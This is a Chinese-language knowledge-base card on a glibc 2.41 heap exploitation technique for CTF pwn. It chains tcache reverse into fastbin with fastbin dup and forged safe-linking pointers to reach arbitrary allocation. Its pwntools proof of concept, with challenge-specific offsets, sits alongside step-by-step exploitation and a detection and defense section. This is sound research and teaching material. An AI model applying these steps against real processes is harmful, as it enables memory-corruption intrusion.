---
id: binary-pwn-heap-tcache-reverse-into-fastbin-fastbin-dup-arbitrary-alloc
title: glibc 2.41 Tcache Reverse Into Fastbin + fastbin dup：受限 UAF 下构造任意地址分配
type: scenario
domain: binary
path: binary/pwn/heap
technique: tcache-reverse-into-fastbin-fastbin-dup
tags:
- pwn
- heap
- glibc
- glibc241
- tcache
- fastbin
- fastbin-dup
- safe-linking
- arbitrary-alloc
- uaf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V215
  verified_at: '2026-11-07T05:04:14+08:00'
  notes: 已对照原文核对 glibc 2.41 _int_malloc fastbin 路径把剩余 chunk 倒灌 tcache、A→B→A fastbin dup、safe-linking 计算与任意地址分配流程，PoC 地址为原题布局。未验证点：未本机复跑；已按 brief 清除 affected_versions（2.41 是题目目标环境版本而非受影响区间）。
url: /docs/binary/pwn/heap/binary-pwn-heap-tcache-reverse-into-fastbin-fastbin-dup-arbitrary-alloc/
draft: false
kb_aliases:
- Tcache Reverse Into Fastbin
- fastbin 倒灌 tcache
- fastbin dup + tcache 任意分配
- glibc 2.41 堆利用
- 受限 UAF 任意分配
- safe-linking tcache 伪造
---

## 一句话结论

在 glibc 2.41 中，当某个 size 的 tcache 为空而 fastbin 非空时，`_int_malloc` 会先取出 fastbin 头作为分配结果，再把 fastbin 链上剩余的 chunk 依次倒灌（stash）进 tcache；若先用 fastbin dup 把链构造成 `A→B→A`，就能让同一个 chunk A 既被分配又被放入 tcache。程序随后写入 A 的用户区即可改写 A 的 tcache `fd`，把伪造目标插入 tcache 链，最终在只有 UAF、show、固定 size 的受限堆题里得到任意地址分配。

## 原理

- **2.41 的防护**：tcache/fastbin 的 `fd` 使用 safe-linking：`PROTECT_PTR(pos, ptr) = (pos >> 12) ^ ptr`，取出时 `REVEAL_PTR` 自逆；没有 `__malloc_hook`/`__free_hook` 可打；`__exit_funcs` 使用 PTR_MANGLE。堆题通常只能靠 UAF 泄露 safe-linking 编码后的堆地址。
- **Tcache Reverse Into Fastbin**：`_int_malloc` 的 fastbin 路径在选出 victim 后，如果 `tcache->counts[idx] < mp_.tcache_count`，会循环把 fastbin 链表中的后续 chunk 取出并 `tcache_put` 进 tcache。源码关键点：
  ```c
  victim = *fb;
  *fb = REVEAL_PTR(victim->fd);
  size_t tc_idx = csize2tidx(nb);
  if (tcache && tc_idx < mp_.tcache_bins)
    while (tcache->counts[tc_idx] < mp_.tcache_count && (tc_victim = *fb) != NULL) {
        *fb = REVEAL_PTR(tc_victim->fd);
        tcache_put(tc_victim, tc_idx);
    }
  return chunk2mem(victim);
  ```
  这里的 `REVEAL_PTR(tc_victim->fd)` 会把攻击者可控的 fd 当作 fastbin 链的下一个指针；只要该值能解码成一个合法地址，这个地址就会被当作 tcache chunk 插入。
- **fastbin dup**：free 路径只检查 fastbin 头是否等于待释放 chunk：
  ```c
  old = *fb;
  if (old == p) malloc_printerr("double free or corruption (fasttop)");
  p->fd = PROTECT_PTR(&p->fd, old);
  *fb = p;
  ```
  按 A、B、A 的顺序释放得到 `A→B→A`；再分配同 size 即可触发上面的倒灌。
- **组合**：先让 tcache 满/空到合适状态，制造 `A→B→A` 的 fastbin 链；请求同 size 时，`_int_malloc` 返回 A，并把 B、A 依次倒灌进 tcache（tcache 头为 A，A.fd 指向 B）。程序在返回后向 A 写数据（A 同时在 tcache 中），即可把 A.fd 改成 `target ^ (A_user >> 12)`；下一次分配弹出 A 后 tcache 头变为 target，再下一次分配返回 target。target 的首 8 字节需解码为 0（或可控的下一个指针），否则该 size 的 tcache 链会损坏。
- **为什么能泄露/利用**：UAF `show` 读已释放 tcache chunk 的 `fd` 得到 safe-linking 编码值，`fd << 12` 可还原堆基址；任意分配后可以改写相邻 chunk 的 size 为 unsortedbin size、泄露 libc，或直接写入 `initial`/TCB 等目标（见关联卡）。

## 触发条件

- glibc 启用 tcache 与 fastbin（2.26+；本文 2.41），存在同 size 的 UAF/双重释放且 free 后指针未清空。
- 能控制或影响 chunk 的 `fd`（例如 UAF 写、或分配后写入仍在 tcache 中的 chunk）。
- tcache 对应 size 的计数可被填满/清空，且 fastbin 链非空；攻击者能让 A 在 fastbin 链中重复出现（fastbin dup）。
- 目标地址 16 字节对齐；其 `fd` 解码结果可控或为 0，以维持 tcache 链可用。
- 有堆地址泄露或可预测堆基址；安全编码（safe-linking）需要正确计算 `(pos >> 12) ^ target`。

## 利用步骤

1. 用 UAF `show` 泄露一个已释放 tcache chunk 的 fd：`heap_leak = u64(show())`，`heap_base = (heap_leak << 12) - 0x1000`。
2. 准备多个同 size（如 0x60）chunk，先把 tcache 填满（7 个），再把 A、B、A 释放进 fastbin，形成 `A→B→A`。
3. 分配若干次把 tcache 清空，使下一次同 size 分配落到 fastbin；此时 `_int_malloc` 取出 A，并把 B、A 倒灌进 tcache。
4. 在返回的 A 的用户区写入伪造 fd：`A.fd = target ^ (A_user >> 12)`（A_user 为 A 的 chunk2mem 地址）；target 首 8 字节应能解码为 0 或受控值。
5. 连续两次同 size 分配：第一次弹出 A，第二次返回 target；之后可向 target 写入，完成任意地址分配/写。
6. 在完整题目中，用该原语把某个 chunk 的 size 改成 unsortedbin size（并伪造 next chunk），free 后 UAF 读泄露 libc；再复用同一原语写 TCB/exit 结构。

## PoC

```python
from pwn import *

# add(idx, data), dele(idx), show(idx) 为题目菜单封装
add(0, b"A"*0x58); dele(0); show(0)          # UAF 读 tcache fd
heap_leak = u64(io.recvn(8))
heap_base = (heap_leak << 12) - 0x1000

# 1) 填满 tcache（7 个），再 fastbin dup：A->B->A
for i in range(11):
    add(i, b"A"*0x58)
for i in range(7):
    dele(i)
dele(7); dele(8); dele(7)

# 2) 清空 tcache，使下一次分配触发 Tcache Reverse Into Fastbin
for i in range(6, -1, -1):
    add(i, b"B"*0x58)

# 3) 改写仍在 tcache 中的 A 的 fd，把 target 插入 tcache
dele(0)
add(0, p64((heap_base + 0x1000) >> 12) * 11)     # 终止值/占位，按实际布局调整
add(7, p64((heap_base + 0x13a0) ^ ((heap_base + 0x16a0) >> 12)) + b"C"*0x50)

# 4) 继续 allocate 消费 tcache，最终返回 target；随后可写 target 处内存
```

说明：上面地址为原文 onigirl 题的具体堆布局；通用利用只需把 `target ^ (A_user >> 12)` 写入 A.fd，并保证 target 的 fd 解码值可控/为 0。PoC 未在本机复跑。

## 变体与关联

- 变体：不依赖 fastbin dup 时，可用其它方式让同一 chunk 在 fastbin 中出现两次（UAF 后再次 free、链交叉等）；核心是让倒灌时读取的 fd 可控。
- 变体：把 target 选在 `tcache_perthread_struct`、堆内伪造 chunk、`free@GOT` 或其他可写元数据处；不同目标需要不同的 fd 解码值与对齐。
- 关联：[[binary-pwn-heap-glibc243-tcache-key-bypass-got-system]]（2.42+ 用 UAF 清 key 绕过 tcache_key，另一种获取任意分配的方式）、[[binary-pwn-heap-tcache-stashing-unlink-largebin-fake-chunk-arbitrary-write]]（smallbin/largebin 的 stashing unlink，机制不同）、[[binary-pwn-heap-glibc223-uaf-fastbin-dup-malloc-hook-realloc-onegadget]]（2.23 fastbin dup 打 hook）。
- 边界：tcache 已满/被禁用、fastbin 链为空、safe-linking 位置计算错误、target 未对齐或 fd 解码不可控、glibc 后续版本增加更多校验时失效。

## 检测与防御

- 修复：free 后立即置空指针，禁止 UAF/双重释放；对同一 size 的分配次数/槽位做硬限制；启用 `MALLOC_CHECK_`、tcache 双 free 检测与 glibc 最新安全补丁。
- 加固：考虑关闭 tcache（`GLIBC_TUNABLES=glibc.malloc.tcache_count=0`）或使用 hardened allocator（scudo、mimalloc 等）；但会改变性能。
- 检测：同一地址短时间内多次 free、fastbin 链出现重复 chunk、tcache/fastbin 计数异常；堆元数据中 safe-linking 解码指向非堆地址；进程崩溃在 `_int_malloc`/`tcache_put`。
- 研究侧：保留不同 glibc 版本的符号与偏移；safe-linking 公式 `(pos>>12)^ptr` 必须按目标版本核对。
